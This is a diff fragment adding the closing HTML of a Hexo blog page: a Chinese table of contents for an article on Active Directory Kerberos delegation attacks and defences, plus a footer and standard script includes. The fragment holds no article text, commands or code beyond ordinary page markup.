+	<div class="toc-wrapper">
+		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%8B%93%E6%89%91%E6%A6%82%E8%A7%88"><span class="toc-article-text">一、环境拓扑概览</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BA%8C%E3%80%81Mermaid-%E5%9F%9F%E5%85%B3%E7%B3%BB%E5%9B%BE"><span class="toc-article-text">二、Mermaid 域关系图</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%89%E3%80%81%E6%A0%B8%E5%BF%83%E8%A1%A8%E6%A0%BC%EF%BC%9A%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E5%8F%8A%E7%99%BB%E5%BD%95%E5%85%B3%E7%B3%BB"><span class="toc-article-text">三、核心表格：账号密码及登录关系</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9B%9B%E3%80%81%E5%9F%9F%E7%99%BB%E5%BD%95%E6%9C%BA%E5%88%B6"><span class="toc-article-text">四、域登录机制</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BA%94%E3%80%81%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90"><span class="toc-article-text">五、常用命令解析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%85%AD%E3%80%81%E5%BD%93%E5%89%8D%E7%8A%B6%E6%80%81%E9%AA%8C%E8%AF%81%EF%BC%88%E9%A2%84%E6%9C%9F%EF%BC%89"><span class="toc-article-text">六、当前状态验证（预期）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%83%E3%80%81Kerberos-%E7%A5%A8%E6%8D%AE%E6%9D%83%E9%99%90%E5%B1%82%E7%BA%A7"><span class="toc-article-text">七、Kerberos 票据权限层级</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#7-1-%E5%90%84%E5%B1%82%E7%BA%A7%E7%A5%A8%E6%8D%AE%E7%9A%84%E4%BB%B7%E5%80%BC%E8%AF%B4%E6%98%8E"><span class="toc-article-text">7.1 各层级票据的价值说明</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#7-2-%E6%94%BB%E5%87%BB%E8%80%85%E8%A7%86%E8%A7%92%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-article-text">7.2 攻击者视角的优先级</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%85%AB%E3%80%81%E6%9C%8D%E5%8A%A1%E4%B8%BB%E4%BD%93%E5%90%8D%E7%A7%B0%EF%BC%88SPN%EF%BC%89%E4%B8%8E%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3"><span class="toc-article-text">八、服务主体名称（SPN）与服务类型详解</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#8-1-%E4%BB%80%E4%B9%88%E6%98%AF-SPN%EF%BC%9F"><span class="toc-article-text">8.1 什么是 SPN？</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#8-2-%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E4%BB%B7%E5%80%BC"><span class="toc-article-text">8.2 常见服务类型及其攻击价值</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#8-3-SPN-%E7%9A%84%E6%B3%A8%E5%86%8C%E4%B8%8E%E6%9F%A5%E8%AF%A2"><span class="toc-article-text">8.3 SPN 的注册与查询</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#8-4-SPN-%E4%B8%8E%E5%A7%94%E6%B4%BE%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-article-text">8.4 SPN 与委派的关系</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#8-5-%E5%B0%8F%E7%BB%93%EF%BC%9A%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8B%E5%86%B3%E5%AE%9A%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84"><span class="toc-article-text">8.5 小结：服务类型决定攻击路径</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B9%9D%E3%80%81%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E8%AF%A6%E8%A7%A3"><span class="toc-article-text">九、非约束委派详解</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#9-1-%E8%AE%BE%E8%AE%A1%E5%88%9D%E8%A1%B7"><span class="toc-article-text">9.1 设计初衷</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#9-2-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-article-text">9.2 工作原理</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#9-3-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-article-text">9.3 攻击流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#9-4-%E6%94%BB%E5%87%BB%E8%80%85%E8%A7%86%E8%A7%92%E4%B8%8E%E7%9B%AE%E6%A0%87%E8%AE%BE%E5%AE%9A%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-article-text">9.4 攻击者视角与目标设定（基于当前环境）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-4-1-%E6%94%BB%E5%87%BB%E8%80%85%E5%81%87%E8%AE%BE%E6%8E%8C%E6%8F%A1%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-article-text">9.4.1 攻击者假设掌握的信息</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-4-2-%E5%8F%AF%E8%83%BD%E7%9A%84%E6%94%BB%E5%87%BB%E5%88%87%E5%85%A5%E7%82%B9"><span class="toc-article-text">9.4.2 可能的攻击切入点</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-4-3-%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E8%BE%BE%E5%88%B0%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-article-text">9.4.3 攻击者可达到的目的</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-4-4-%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E4%BB%B7%E5%80%BC%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-article-text">9.4.4 普通域用户登录场景下的价值与利用</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#9-5-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%BB%93%E5%90%88%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E%EF%BC%88Spooler%EF%BC%89%E6%94%BB%E5%87%BB"><span class="toc-article-text">9.5 非约束委派结合打印机漏洞（Spooler）攻击</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-5-1-%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">9.5.1 前置条件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-5-2-%E5%8E%9F%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-article-text">9.5.2 原理概述</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-5-3-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-article-text">9.5.3 攻击流程</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-5-4-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E"><span class="toc-article-text">9.5.4 攻击步骤详细说明</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#9-5-5-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-article-text">9.5.5 注意事项</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#9-6-%E9%98%B2%E5%BE%A1%E6%8F%90%E7%A4%BA"><span class="toc-article-text">9.6 防御提示</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8D%81%E3%80%81%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E8%AF%A6%E8%A7%A3"><span class="toc-article-text">十、约束委派详解</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#10-1-%E8%AE%BE%E8%AE%A1%E5%88%9D%E8%A1%B7"><span class="toc-article-text">10.1 设计初衷</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#10-2-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-article-text">10.2 工作原理</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#10-3-%E5%85%B3%E4%BA%8E-ST1-%E4%B8%8E-ST2-%E7%9A%84%E8%AF%B4%E6%98%8E"><span class="toc-article-text">10.3 关于 ST1 与 ST2 的说明</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#10-4-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-article-text">10.4 攻击流程</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E"><span class="toc-article-text">攻击步骤详细说明</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#10-5-%E6%94%BB%E5%87%BB%E8%80%85%E8%A7%86%E8%A7%92%E4%B8%8E%E7%9B%AE%E6%A0%87%E8%AE%BE%E5%AE%9A%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-article-text">10.5 攻击者视角与目标设定（基于当前环境）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#10-5-1-%E6%94%BB%E5%87%BB%E8%80%85%E5%81%87%E8%AE%BE%E6%8E%8C%E6%8F%A1%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-article-text">10.5.1 攻击者假设掌握的信息</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#10-5-2-%E6%94%BB%E5%87%BB%E5%88%87%E5%85%A5%E7%82%B9"><span class="toc-article-text">10.5.2 攻击切入点</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#10-5-3-%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E8%BE%BE%E5%88%B0%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-article-text">10.5.3 攻击者可达到的目的</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#10-5-4-%E4%B8%8E%E5%85%B6%E4%BB%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%85%B3%E8%81%94"><span class="toc-article-text">10.5.4 与其他攻击的关联</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#10-6-%E9%98%B2%E5%BE%A1%E6%8F%90%E7%A4%BA"><span class="toc-article-text">10.6 防御提示</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E8%AF%A6%E8%A7%A3"><span class="toc-article-text">十一、基于资源的约束委派详解</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#11-1-%E8%AE%BE%E8%AE%A1%E5%88%9D%E8%A1%B7"><span class="toc-article-text">11.1 设计初衷</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#11-2-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-article-text">11.2 工作原理</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#11-3-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%88%E5%A4%8D%E7%8E%B0%E6%A1%88%E4%BE%8B%EF%BC%89"><span class="toc-article-text">11.3 攻击流程（复现案例）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#11-3-1-%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">11.3.1 前置条件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#11-3-2-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%EF%BC%9A%E5%88%9B%E5%BB%BA%E4%B8%93%E7%94%A8%E5%B7%A5%E4%BD%9C%E7%9B%AE%E5%BD%95"><span class="toc-article-text">11.3.2 准备工作：创建专用工作目录</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#11-3-3-%E5%A4%8D%E7%8E%B01%EF%BC%9A%E5%88%A9%E7%94%A8%E6%99%AE%E9%80%9A%E5%9F%9F%E8%B4%A6%E5%8F%B7%E6%8F%90%E5%8D%87%E5%88%B0%E5%9F%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%EF%BC%88%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%EF%BC%89"><span class="toc-article-text">11.3.3 复现1：利用普通域账号提升到域本地管理员（攻击域控）</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#11-3-4-%E5%A4%8D%E7%8E%B02%EF%BC%9A%E8%B5%84%E6%BA%90%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%85%B6%E4%BB%96%E5%9F%9F%E4%B8%BB%E6%9C%BA%E8%8E%B7%E5%8F%96-system-%E6%9D%83%E9%99%90"><span class="toc-article-text">11.3.4 复现2：资源委派攻击其他域主机获取 system 权限</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#11-3-5-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-article-text">11.3.5 注意事项</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#11-4-%E6%94%BB%E5%87%BB%E8%80%85%E8%A7%86%E8%A7%92%E4%B8%8E%E7%9B%AE%E6%A0%87%E8%AE%BE%E5%AE%9A%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-article-text">11.4 攻击者视角与目标设定（基于当前环境）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#11-4-1-%E6%94%BB%E5%87%BB%E8%80%85%E5%81%87%E8%AE%BE%E6%8E%8C%E6%8F%A1%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-article-text">11.4.1 攻击者假设掌握的信息</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#11-4-2-%E6%94%BB%E5%87%BB%E5%88%87%E5%85%A5%E7%82%B9"><span class="toc-article-text">11.4.2 攻击切入点</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#11-4-3-%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E8%BE%BE%E5%88%B0%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-article-text">11.4.3 攻击者可达到的目的</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#11-5-%E9%98%B2%E5%BE%A1%E6%8F%90%E7%A4%BA"><span class="toc-article-text">11.5 防御提示</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-article-text">十二、总结</span></a></li></ol>
+			</div>
+		
+		</div>
+	</div>
+
+</div><!-- col-md-3 -->
+
+
+		</div>
+
+		
+
+	</div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 ZQ-Rookie-Hacker's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
